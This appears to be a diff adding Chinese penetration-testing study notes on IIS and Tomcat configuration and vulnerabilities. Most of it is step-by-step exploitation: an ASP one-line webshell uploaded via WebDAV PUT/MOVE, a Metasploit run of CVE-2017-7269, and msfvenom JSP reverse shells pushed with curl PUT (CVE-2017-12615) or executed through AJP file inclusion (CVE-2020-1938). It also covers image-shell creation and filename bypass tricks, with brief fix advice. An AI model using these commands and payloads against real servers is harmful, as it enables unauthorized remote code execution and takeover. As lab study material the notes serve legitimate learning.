@@ -1,0 +1,341 @@
+中间件：即用于系统软件和应用软件之间连接、沟通的软件或程序。
+IIS：只适用于win。 默认用户账号：nt authority\network service比较安全。默认只能运行静态网站。 
+主要搭配asp、asp.net等。
+
+
+IIS安装配置：win_server_2003_enterx64
+控制面板->添加或删除程序->添加或删除组件->安装应用程序和服务器
+管理工具-->IIS信息服务管理器-->网站、右键、新建网站-->站长之家随意下载一个asp源码-->
+网站ip分配一般选本地ip-->端口一般80->将源码文件夹如testq1放在C:\Inetpub\wwwroot\下(IIS网站目录)-->
+选中运行匿名访问，目录选择为testq1文件夹-->网站名如te1 右键权限->赋予权限-->
+web服务扩展->启动相关服务。
+te1->右键属性 主目录 执行权限设置为纯脚本->文档 启动默认文档 如：添加index.html 将其移动到第一位->
+目录安全性->身份验证和访问控制 编辑->不勾选继承windows身份验证。
+te1 右键重启。
+Web服务扩展->APS.NET设置为允许。
+成功访问。
+
+一般经常将网站源码放在C:\Interpub\zshop\下。
+C:\Interpub\zshop2\下等，不容易出现权限等问题。
+选择zshop2文件夹即可。
+
+
+IIS相关知识：
+主目录：
+脚本访问资源：用户可以访问文件的源码，如Active Server Pages(ASP)中脚本资源访问的脚本。
+目录浏览：用户可查看文件列表。
+
+执行权限：
+无：纯文本执行。
+纯脚本：可执行脚本。
+脚本和可执行文件：可执行脚本和执行可执行文件(exe\dll等)。
+
+web服务扩展：
+Actice Server Pages：asp脚本运行平台
+在服务器端的包含文件：启动文件包含的功能
+WebDAV：扩展http请求方式
+Internet数据连接器：启动数据库连接池功能
+所有未知CGI扩展：启动CGI(CGI：通用网关接口，是一个weib服务器主机提供信息服务的标准接口)
+所有未知ISAP扩展：微软为了替代CGI的，功能类似。
+
+
+站点如zshop 右键 权限配置。
+
+
+法2：
+或直接将包含类似index.asp文件的一大堆文件直接放到C:\Inetpub\wwwroot\下。
+
+
+IIS漏洞：
+1. IIS短文件/文件夹名称漏洞：没什么用。
+核心：主要是由http请求中代字符~引起的。 它允许远程攻击者在web根目录下公开文件等名称(原本无权访问)。
+即当文件名足够长，则后面的字符都用~代替。
+
+范围：win7、win2008、xp、win2000等。
+
+原理：
+为了兼容16位MS-DOS程序，win为文件名较长的文件(或文件名)生成了对应的windows 8.3短文件名。
+如：
+有个aaaaaaaaaaaaaaa.txt文件。
+cmd下通过dir /x命令则显示：aaaaaa~1.txt	其中/x即表示显示短文件名。
+
+短文件名有以下特征：
+1.只有前6位字符直接显示，后续字符用~1代替。
+2.数字1可以递增，若存在多个文件名类似的文件(名称前6位必须相同，且后缀名(以最后一个.作为分隔符)前3位必须相同)。
+3.后缀名最长只有3位，多余的被截断。
+如：
+zzzzzzzzq1.txt
+zzzzzzzzqw2.txtaskdkwd
+zzzzzzzzqwdadadwd.qdw.dfgfdg.txtzlzlzlplz
+对应的短文件名分别为：
+ZZZZZZ~1.TXT
+ZZZZZZ~2.TXT
+ZZZZZZ~3.TXT
+
+
+故可以在启用.net的IIS下暴力列举短文件名：因为：
+1. 访问构造的某个存在的短文件名，则返回404
+2. 访问构造的某个不存在的短文件名，则返回400
+
+利用：通过访问短文件名，去大概猜解存在哪些文件名。
+
+
+
+深入暴破猜解文件全名：
+短文件名需继续猜解出全名才能在IIS上访问。
+1.通过对目录站点或同类型站点爬虫，建立一个字典库，结合得到的短文件名来猜解其余字符。
+2.利用fuzzdb(一个应用程序模糊测试(fuzzing)数据库)来猜解。
+3.结合dirbuster工具。
+研究报告地址：
+https://webbreacher.com/2014/10/23/tilde-enumeration/	推荐
+python程序下载：
+https://github.com/WebBreacher/tilde_enum	推荐
+
+
+
+IIS短文件漏洞修复方案：
+1.升级.net framework
+2.修改注册表键值：
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem
+修改NtfsDisable8dot3NameCreation为1
+
+
+IIS6.0解析漏洞：重点。 解析漏洞检测：nmap -sV
+1.目录解析：
+网站下建有类似名为*.asp、*.asa的文件夹，其目录内的任何扩展名的文件都会被IIS当作asp文件来解析并执行。
+如：z6w.jpg里面写一句话木马。 也能是z6w.txt
+或图片马。
+
+2.后缀解析：
+myz.asp;.jpg  或  azw.asp;.jpg		一般抓包改
+相当于被;截断了，绕过过滤，还是当作asp来执行。
+注：IIS6.0可执行文件后缀名有：
+*.asp、*.asa、*.cer、*.cdx
+因为在IIS默认配置中，这几个后缀都默认由asp.dll来解析。
+
+
+
+生成图片马：
+win下：
+如：
+copy q1.jpg/b + q2.php/a f3.jpg
+其中/b指二进制[binary]模式；/a指ascii模式
+或q2.txt等都行。 图片能正常打开，代码被添加到最后。
+
+linux下：最好采用这种合并的方式，而不是追加的方式。
+cat zw.png q1.txt >> zwpz.png
+
+
+
+
+Telnet协议：TCP/IP中一员。是Internet远程登录服务标准协议。
+注：Telnet使用，输入内容后需按两次回车键才会发出请求。
+
+cmd > telnet 192.168.36.8 80
+
+
+
+nc常用参数：
+-l	//指定处于监听
+-p 86	//指定监听在86端口
+-s	//指定发送数据的源IP4
+-u	//指定nc使用UDP，默认为TCP
+-v	//或-vv 交互、详细信息
+-w 10	//超时10s
+-g 869  //指定使用本地的869端口进行连接(eg1：nc -g 869 192.168.43.141 65501)
+-z	//表示扫描时不发任何数据
+如：nc -lvp 86	//监听在86端口
+
+nc 192.168.43.8 8033	//连接该ip的8033端口(默认TCP)
+
+
+
+IIS写方法漏洞：
+核心：源于服务器配置不当。主要是因为服务器开启了webdav组件导致。
+WebDAV：一种基于HTTP 1.1协议的通信协议。
+即其增加了新的方法，如put、copy、move、delete等。
+
+复现条件：
+1.开启webda
+2.开启网站写权限
+3.IIS用户必须有对应目标目录的写权限(ntfs权限)
+
+IIS写方法漏洞利用：
+1.探测是否开启webdav(nmap)：
+nmap -sT -sV -p 80-90,433,443,8001-8090,8443 -O --script http-headers.nse,http-methods,http-put.nse,http-iis-webdav-vuln.nse,http-iis-short-name-brute --open -Pn -v -oN iis6_res.txt 192.168.46.0/24
+
+内网探测使用MSF：
+msf> use auxiliary/scanner/http/webdav_scanner	
+可以设置线程
+
+2.手工或工具：
+A.判断支持哪些http请求方法：
+cmd> telnet 192.168.4.8 80
+Ctrl + ]		//按下这个相当于进入输入模式
+OPTIONS / HTTP/1.1	//内容
+HOST:192.168.4.8
+
+然后两次回车，发送请求。
+B.上传一句话木马：
+PUT一句话文件，如z6w.txt，再通过复制移动重命名等方式改为asp文件。
+直接上传脚本会报403.   如：
+------------------1s-------------------
+PUT /Readmes.txt HTTP/1.1
+Host: 192.168.4.6
+Content-Length: 25
+
+<%execute request("ab")%>
+--------------------1e--------------
+C.修改一句话后缀：
+复制移动重命名：
+--------------2s----------------------
+MOVE /Readmes.txt HTTP/1.1
+HOST: 192.168.4.6
+Destination: http://192.168.8.8/Readme.asa;.jpg
+------------------2e--------------------
+或命名为Readme.asp也行。
+
+工具：IIS PUT Scanner.
+
+
+IIS6.0 webdav溢出漏洞利用[cve-2017-7269]：
+原理：IIS6.0的webdav服务中的ScStorgPathFromUrl函数存在缓冲区溢出漏洞。
+远程攻击者通过以"if:<http://"开头的长header PROPFIND请求，执行任意代码。
+利用前提：
+1. win server 2003或win server 2003 R2上运行IIS6.0；其他版本可能存在。
+2.开启WebDav功能(具体为PROPFIND方法，成功则返回207或者200)。
+
+
+步骤：
+1.判断是否存在webdav溢出漏洞：
+2.利用MSF利用(支持x84和x64)：https://github.com/zcgonvh/cve-2017-7269
+
+
+msf下：
+use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+set rhosts 192.168.36.8
+ser rport 80
+set maxpathlength 110 115 	//长度基本就够了。即110到115之间。
+set targeturi /
+set payload windows/meterpreter/reverse_tcp_rc4_dns
+set lhost 192.168.131.128
+set lport 8080
+set rc4password sec
+exploit
+
+meterpreter > sysinfo
+meterpreter > getuid  回来的shell前线，正常下都是network service权限。
+
+
+
+
+POST发包：
+cmd > curl -H "Content-Type:application/json" -X POST -d '{"user": "admin", "passwd":"12345678"}' http://127.0.0.1:8000/login
+curl带上headers：
+cmd > curl -H 'Host:157.166.226.25' -H 'Accept-Language:es' -H 'Cookie:ID=1234' http://cnn.com
+
+
+
+cve-2017-12615：tomcat远程代码执行。
+当tomcat运行再win平台，且启用了HTTP PUT方法(如：将readonly初始化参数由默认值设置为false)，攻击者上传任意代码的jsp文件，导致命令执行。
+条件：win平台；开启了http put方法。
+影响范围：
+apache tomcat 7.0.0-7.0.79
+
+复现：
+修改Tomcat的conf\web.xml配置文件
+在100行左右位置的servlet中添加init-param项：
+添加readonly设置为false时的情况(添加以下代码)：
+-------------1s-------------------
+<init-param>
+    <param-name>readonly</param-name>
+    <param-value>false</param-value>
+</init-param>
+------------------1e------------------
+重启tomcat.
+
+利用：
+1.准备jsp代码：
+msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.88.128 LPORT=8386 -a x64 -f raw > shellz.jsp
+其中-a指定架构。
+x64版本一般都能运行x86和x64版本。
+
+
+2.发送jsp：以下几种方式都行。
+curl -X PUT http://192.168.88.134:8080/bRseadmxes.jsp/ -d @- < shellz.jsp
+curl -X PUT http://192.168.88.134:8080/bRseadmxes.jsp. -d @- < shellz.jsp
+curl -X PUT http://192.168.88.134:8080/bRseadmxes.jsp%20 -d @- < shellz.jsp
+
+或直接使用burp上传。
+
+常用netstat -antop | grep 23	查看特定端口和对应进程。
+kill -9 38	//其中38为该端口对应的PID，杀掉即可。
+
+msf监听：
+使用的payload对应为：java/jsp_shell_reverse_tcp
+msf6 > use exploit/multi/handler 
+msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp 
+
+或使用脚本，完全可以自己写一个。
+
+
+
+
+cve-2020-1938：apache tomcat文件包含漏洞。
+原理：是由于Tomcat AJP协议存在缺陷所致。攻击者能读取服务器webapp目录下的任意文件。
+如：webapp配置文件或源码等。若目标服务器还能文件上传，则很可能造成文件执行。
+默认端口：8009
+
+利用条件：
+tomcat默认的conf\server.xml中配置了2个Connector(默认有配置)
+
+漏洞影响范围：
+Apache Tomcat 6
+Apache Tomcat 7 < 7.0.100
+Apache Tomcat 8 < 8.5.51
+Apache Tomcat 9 < 9.0.31
+
+
+修复建议：
+1.临时禁用AJP协议端口，在conf\server.xml配置文件中注释掉即可。
+2.配置ajp配置中的secretRequired和secret属性来限制认证。
+3.升级、打补丁。
+
+利用：如：读取web.xml文件。
+python .\CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 192.168.88.134
+
+
+使用CVE-2020-1938-Tomact-file_include-file_read-master下的文件：
+文件读取：
+python2 "Tomcat-ROOT路径下文件读取(CVE-2020-1938).py" -p 8009 -f /test.txt 127.0.0.1
+文件包含：
+python2 "Tomcat-ROOT路径下文件包含(CVE-2020-1938).py" -p 8009 -f /test.txt 127.0.0.1
+
+比如：
+msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.88.128 LPORT=8386 -a x64 -f raw > shellz.txt
+或shellz.png等。
+将其上传-->msf监听：
+msf6 > use exploit/multi/handler 
+msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp 
+
+-->再通过文件包含的方式使其执行：
+python2 Tomcat-ROOT路径下文件包含(CVE-2020-1938).py -p 8009 -f shellz.txt 192.168.88.134
+
+若是其他的Connector或端口，则需灵活判断。
+
+
+文件上传一般都需配合文件包含漏洞来配合利用。
+
+
+
+
+
+
+
+
+
+注：
+shell.jsp%20 是利用windows自动去处空格结尾的特性
+shell.jsp::$DATA 是利用NTFS流
+shell.jsp.	在windows中会自动去掉.
+shell.jsp/  是利用linux或windows中不允许文件名带有/，故会自动取消
